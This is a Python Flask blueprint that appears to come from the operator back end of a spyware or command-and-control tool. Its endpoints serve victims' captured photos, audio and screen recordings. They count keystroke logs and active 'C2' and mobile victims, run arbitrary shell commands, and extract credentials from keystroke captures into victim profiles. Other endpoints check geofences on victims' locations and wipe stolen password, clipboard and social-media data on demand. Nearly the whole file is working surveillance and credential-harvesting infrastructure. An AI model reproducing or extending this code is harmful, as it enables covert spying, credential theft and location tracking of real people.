"""system blueprint (P3 batch extract)."""
from __future__ import annotations

import os, json, base64
import uuid as uuid_module
from datetime import datetime, timedelta
from functools import wraps
from flask import (Blueprint, request, jsonify, redirect, url_for, render_template, send_from_directory, make_response, session, Response)
from app.state import *  # noqa: F401,F403  -- P3
from app.state import BASE_DIR, CONFIG, STORE, _decode_data_url, _save_mobile_capture
import database as db

import platform
import psutil
from credential_parser import get_credential_stats, scan_fingerprints, scan_keystroke_files
import hashlib
import subprocess
import time
bp = Blueprint("system", __name__,
               template_folder=os.path.join(BASE_DIR, "flask_templates"))


@bp.route('/api/images')
def get_images():
    """API endpoint to list all captured images"""
    images_dir = os.path.join(BASE_DIR, 'images')
    os.makedirs(images_dir, exist_ok=True)
    
    try:
        files = os.listdir(images_dir)
        images = []
        for f in files:
            if f.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                file_path = os.path.join(images_dir, f)
                images.append({
                    'name': f,
                    'url': f'/images/{f}',
                    'timestamp': os.path.getmtime(file_path)
                })
        # Sort by timestamp descending (newest first)
        images.sort(key=lambda x: x['timestamp'], reverse=True)
        return jsonify({'images': images})
    except Exception as e:
        return jsonify({'error': str(e), 'images': []}), 500

@bp.route('/api/audio')
def get_audio():
    """API endpoint to list all recorded audio files"""
    sounds_dir = os.path.join(BASE_DIR, 'sounds')
    os.makedirs(sounds_dir, exist_ok=True)
    
    try:
        files = os.listdir(sounds_dir)
        audio_files = []
        for f in files:
            if f.lower().endswith(('.wav', '.mp3', '.m4a', '.ogg', '.webm')):
                file_path = os.path.join(sounds_dir, f)
                audio_files.append({
                    'name': f,
                    'url': f'/sounds/{f}',
                    'timestamp': os.path.getmtime(file_path)
                })
        # Sort by timestamp descending (newest first)
        audio_files.sort(key=lambda x: x['timestamp'], reverse=True)
        return jsonify({'audio': audio_files})
    except Exception as e:
        return jsonify({'error': str(e), 'audio': []}), 500

@bp.route('/images/<filename>')
def serve_image(filename):
    """Serve captured images"""
    images_dir = os.path.join(BASE_DIR, 'images')
    return send_from_directory(images_dir, filename)

@bp.route('/sounds/<filename>')
def serve_sound(filename):
    """Serve recorded audio files"""
    sounds_dir = os.path.join(BASE_DIR, 'sounds')
    return send_from_directory(sounds_dir, filename)


# Compatibility routes for original PHP filenames (avoid 404s from existing JS)

@bp.route('/api/delete_images', methods=['POST'])
def delete_images():
    images_dir = os.path.join(BASE_DIR, 'images')
    if os.path.exists(images_dir):
        for f in os.listdir(images_dir):
            file_path = os.path.join(images_dir, f)
            try:
                if os.path.isfile(file_path):
                    os.unlink(file_path)
            except Exception:
                pass
    return 'OK'

@bp.route('/api/delete_audio', methods=['POST'])
def delete_audio():
    sounds_dir = os.path.join(BASE_DIR, 'sounds')
    if os.path.exists(sounds_dir):
        for f in os.listdir(sounds_dir):
            file_path = os.path.join(sounds_dir, f)
            try:
                if os.path.isfile(file_path):
                    os.unlink(file_path)
            except Exception:
                pass
    return 'OK'

@bp.route('/api/terminal', methods=['POST'])
def terminal_exec():
    """Handle terminal commands execution"""
    try:
        if not session.get('IAm-logined'):
            return jsonify({'error': 'Unauthorized', 'output': 'Unauthorized access'}), 401

        data = request.json
        cmd = data.get('cmd', '').strip()
        
        # Get current working directory from session or default
        cwd = session.get('cwd', os.getcwd())
        
        # Verify CWD exists, if not reset to default
        if not os.path.exists(cwd):
            cwd = os.getcwd()
            session['cwd'] = cwd

        if not cmd:
            return jsonify({'output': '', 'cwd': cwd})

        # Handle Directory Changes (cd)
        if cmd.startswith('cd '):
            new_dir_part = cmd[3:].strip()
            # Handle "cd" (home) or "cd ~"
            if not new_dir_part or new_dir_part == '~':
                new_path = os.path.expanduser('~')
            else:
                new_path = os.path.join(cwd, new_dir_part)
            
            # Resolve relative paths (..)
            new_path = os.path.abspath(new_path)
            
            if os.path.isdir(new_path):
                session['cwd'] = new_path
                return jsonify({'output': '', 'cwd': new_path})
            else:
                return jsonify({'output': f"cd: {new_dir_part}: No such file or directory", 'cwd': cwd})

        # Process standard commands
        try:
            # Use specific shell based on OS
            shell_cmd = cmd
            if os.name == 'nt':
                # Windows: we might want to capture stderr too
                # Using shell=True for internal commands like dir, echo
                completion = subprocess.run(shell_cmd, cwd=cwd, shell=True, capture_output=True, text=True)
            else:
                completion = subprocess.run(shell_cmd, cwd=cwd, shell=True, capture_output=True, text=True, executable='/bin/bash')
            
            output = completion.stdout
            if completion.stderr:
                output += "\n" + completion.stderr
                
            return jsonify({'output': output, 'cwd': cwd})
            
        except Exception as e:
            return jsonify({'output': str(e), 'cwd': cwd})
            
    except Exception as e:
        return jsonify({'error': str(e), 'output': f"Server Error: {str(e)}"}), 500

@bp.route('/videos/<filename>')
def serve_video(filename):
    """Serve captured screen recordings"""
    videos_dir = os.path.join(BASE_DIR, 'videos')
    os.makedirs(videos_dir, exist_ok=True)
    return send_from_directory(videos_dir, filename)


# moved to app/blueprints/capture_mobile.py -> '/api/mobile/clients' (mobile_clients)


# moved to app/blueprints/capture_mobile.py -> '/api/mobile/send_command' (mobile_send_command)


# moved to app/blueprints/capture_mobile.py -> '/api/mobile/get_response/<uid>' (mobile_get_response)



# moved to app/blueprints/capture_mobile.py -> '/api/mobile/background_data' (mobile_background_data)


# moved to app/blueprints/capture_mobile.py -> '/api/mobile/tracking_data/<uid>' (mobile_get_tracking_data)

@bp.route('/api/analytics/dashboard')
def analytics_dashboard():
    """Real-time dashboard statistics"""
    try:
        images_dir = os.path.join(BASE_DIR, 'images')
        sounds_dir = os.path.join(BASE_DIR, 'sounds')
        fingerprints_dir = os.path.join(BASE_DIR, 'fingerprints')
        keystrokes_dir = os.path.join(BASE_DIR, 'keystrokes')
        sessions_dir = os.path.join(BASE_DIR, 'sessions')
        
        image_count = len([f for f in os.listdir(images_dir) if f.lower().endswith(('.png','.jpg','.jpeg'))]) if os.path.exists(images_dir) else 0
        audio_count = len([f for f in os.listdir(sounds_dir) if f.lower().endswith(('.wav','.mp3','.webm'))]) if os.path.exists(sounds_dir) else 0
        fingerprint_count = len([f for f in os.listdir(fingerprints_dir) if f.endswith('.json')]) if os.path.exists(fingerprints_dir) else 0
        keystroke_count = len([f for f in os.listdir(keystrokes_dir) if f.endswith('.json')]) if os.path.exists(keystrokes_dir) else 0
        session_count = len([f for f in os.listdir(sessions_dir) if f.endswith('_meta.json')]) if os.path.exists(sessions_dir) else 0
        
        # Count active C2 + mobile victims
        active_c2 = sum(1 for s in STORE.c2_all_sessions().values() if (datetime.now() - datetime.fromisoformat(s['last_seen'])).total_seconds() < 60)
        active_mobile = sum(1 for s in STORE.mobile_all_sessions().values() if (datetime.now() - datetime.fromisoformat(s['last_seen'])).total_seconds() < 60)
        
        # Disk usage
        total_size = 0
        for dirpath, dirnames, filenames in os.walk(BASE_DIR):
            for f in filenames:
                fp = os.path.join(dirpath, f)
                try:
                    total_size += os.path.getsize(fp)
                except:
                    pass
        
        # System info
        uptime_seconds = (datetime.now() - datetime.fromisoformat(ANALYTICS['start_time'])).total_seconds()
        
        return jsonify({
            'captures': {
                'images': image_count,
                'audio': audio_count,
                'fingerprints': fingerprint_count,
                'keystrokes': keystroke_count,
                'sessions': session_count,
                'total': image_count + audio_count + fingerprint_count + keystroke_count
            },
            'victims': {
                'c2_active': active_c2,
                'c2_total': len(STORE.c2_all_sessions()),
                'mobile_active': active_mobile,
                'mobile_total': len(STORE.mobile_all_sessions()),
                'total_active': active_c2 + active_mobile,
                'total_all': len(STORE.c2_all_sessions()) + len(STORE.mobile_all_sessions())
            },
            'system': {
                'uptime': int(uptime_seconds),
                'disk_usage': total_size,
                'cpu_percent': psutil.cpu_percent() if psutil else 0,
                'memory_percent': psutil.virtual_memory().percent if psutil else 0,
                'platform': platform.system(),
                'python_version': platform.python_version(),
            },
            'activity': {
                'total_events': len(ANALYTICS['events']),
                'unique_ips': len(ANALYTICS['ip_addresses']),
                'hourly': dict(list(ANALYTICS['hourly_activity'].items())[-24:]),
            },
            'recent_events': ANALYTICS['events'][-20:]
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@bp.route('/api/analytics/timeline')
def analytics_timeline():
    """Get activity timeline data for charts"""
    try:
        hours = int(request.args.get('hours', 24))
        now = datetime.now()
        
        timeline = []
        for i in range(hours, 0, -1):
            hour = (now - timedelta(hours=i)).strftime('%Y-%m-%d %H:00')
            timeline.append({
                'time': hour,
                'label': (now - timedelta(hours=i)).strftime('%H:%M'),
                'count': ANALYTICS['hourly_activity'].get(hour, 0)
            })
        
        return jsonify({'timeline': timeline})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@bp.route('/api/analytics/geo')
def analytics_geo():
    """Get geolocation data for map visualization"""
    try:
        return jsonify({'locations': ANALYTICS['geo_data'][-200:]})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@bp.route('/api/system/info')
def system_info():
    """Detailed system information"""
    try:
        info = {
            'hostname': platform.node(),
            'os': f"{platform.system()} {platform.release()}",
            'architecture': platform.machine(),
            'python': platform.python_version(),
            'cpu_count': os.cpu_count(),
            'cpu_percent': psutil.cpu_percent(interval=0.1) if psutil else 0,
            'memory': {
                'total': psutil.virtual_memory().total if psutil else 0,
                'used': psutil.virtual_memory().used if psutil else 0,
                'percent': psutil.virtual_memory().percent if psutil else 0,
            },
            'disk': {
                'total': psutil.disk_usage('/').total if psutil else 0,
                'used': psutil.disk_usage('/').used if psutil else 0,
                'percent': psutil.disk_usage('/').percent if psutil else 0,
            },
            'network_interfaces': [],
            'uptime': int((datetime.now() - datetime.fromisoformat(ANALYTICS['start_time'])).total_seconds()),
        }
        
        # Network interfaces
        try:
            import socket
            hostname = socket.gethostname()
            info['local_ip'] = socket.gethostbyname(hostname)
            if psutil:
                for iface, addrs in psutil.net_if_addrs().items():
                    for addr in addrs:
                        if addr.family == socket.AF_INET:
                            info['network_interfaces'].append({
                                'name': iface,
                                'ip': addr.address,
                                'netmask': addr.netmask
                            })
        except:
            pass
        
        return jsonify(info)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@bp.route('/api/alerts')
def get_alerts():
    """Get active security alerts"""
    alerts = ANALYTICS.get('active_alerts', [])
    return jsonify({'alerts': alerts[-50:]})

@bp.route('/api/alerts/add', methods=['POST'])
def add_alert():
    """Add a new alert"""
    data = request.json
    alert = {
        'id': hashlib.md5(str(time.time()).encode()).hexdigest()[:8],
        'title': data.get('title', 'Alert'),
        'message': data.get('message', ''),
        'severity': data.get('severity', 'info'),
        'timestamp': datetime.now().isoformat(),
        'read': False
    }
    ANALYTICS['active_alerts'].append(alert)
    return jsonify({'status': 'added', 'alert': alert})

@bp.route('/api/alerts/clear', methods=['POST'])
def clear_alerts():
    """Clear all alerts"""
    ANALYTICS['active_alerts'] = []
    return jsonify({'status': 'cleared'})

@bp.route('/api/nuke', methods=['POST'])
def nuke_all_data():
    """Emergency data wipe - delete all captured data"""
    try:
        dirs_to_clean = ['images', 'sounds', 'fingerprints', 'keystrokes', 'sessions', 'clipboard', 'network-scans', 'password-managers', 'social-media']
        deleted = 0
        for d in dirs_to_clean:
            dirpath = os.path.join(BASE_DIR, d)
            if os.path.exists(dirpath):
                for f in os.listdir(dirpath):
                    fp = os.path.join(dirpath, f)
                    try:
                        if os.path.isfile(fp):
                            os.unlink(fp)
                            deleted += 1
                    except:
                        pass
        
        # Clear in-memory data
        ANALYTICS['events'].clear()
        ANALYTICS['geo_data'].clear()
        ANALYTICS['active_alerts'].clear()
        ANALYTICS['ip_addresses'].clear()
        
        return jsonify({'status': 'nuked', 'files_deleted': deleted})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@bp.route('/api/recon/config', methods=['GET', 'POST'])
def recon_config():
    if request.method == 'POST':
        data = request.json
        RECON_CONFIG.update(data)
        return jsonify({'status': 'updated', 'config': RECON_CONFIG})
    return jsonify({'config': RECON_CONFIG})

@bp.route('/api/recon/run', methods=['POST'])
def recon_run():
    """Run full auto-recon pipeline"""
    results = {}
    
    # 1. Scan for credentials
    try:
        from credential_parser import scan_keystroke_files, scan_fingerprints, get_credential_stats
        ks_creds = scan_keystroke_files()
        fp_creds = scan_fingerprints()
        all_creds = ks_creds + fp_creds
        for cred in all_creds:
            db.save_credential(
                cred_type=cred['type'], value=cred['value'],
                source=cred.get('source', 'recon'), source_file=cred.get('file', ''),
                url=cred.get('url', ''), confidence=cred.get('confidence', 50),
            )
        results['credentials'] = len(all_creds)
    except Exception as e:
        results['credentials_error'] = str(e)
    
    # 2. Build profiles
    try:
        fp_dir = os.path.join(BASE_DIR, 'fingerprints')
        profile_count = 0
        if os.path.exists(fp_dir):
            for f in os.listdir(fp_dir):
                if f.endswith('.json'):
                    with open(os.path.join(fp_dir, f), 'r') as fh:
                        data = json.load(fh)
                    basic = data.get('basic', {})
                    ip = data.get('ip', basic.get('ip', ''))
                    if ip:
                        db.save_victim_profile(ip=ip, fingerprint_hash=data.get('hash', ''),
                            user_agent=basic.get('userAgent', ''), platform_name=basic.get('platform', ''))
                        profile_count += 1
        results['profiles'] = profile_count
    except Exception as e:
        results['profiles_error'] = str(e)
    
    # 3. Check geofences
    try:
        geo_alerts = 0
        for geo in ANALYTICS.get('geo_data', []):
            triggered = db.check_geofence(geo.get('lat', 0), geo.get('lng', 0))
            geo_alerts += len(triggered)
        results['geofence_alerts'] = geo_alerts
    except Exception as e:
        results['geofence_error'] = str(e)
    
    track_event('recon_pipeline', results)
    return jsonify({'status': 'complete', 'results': results})

@bp.route('/api/operator/log')
def operator_log():
    logs = db.get_operator_log()
    return jsonify({'logs': logs})

@bp.route('/api/operator/log', methods=['POST'])
def operator_log_add():
    data = request.json
    db.log_operator_action(
        operator=session.get('IAm-logined', 'unknown'),
        action=data.get('action', ''),
        details=data.get('details', ''),
        ip=request.remote_addr,
    )
    return jsonify({'status': 'logged'})


# ---------------------------------------------------------------------------
# P3.23: legacy .php aliases moved verbatim from app.py
# ---------------------------------------------------------------------------
@bp.route('/api/images.php')
def get_images_php():
    return get_images()
@bp.route('/api/audio.php')
def get_audio_php():
    return get_audio()
@bp.route('/api/delete_images.php', methods=['POST'])
def delete_images_php():
    return delete_images()
@bp.route('/api/delete_audio.php', methods=['POST'])
def delete_audio_php():
    return delete_audio()
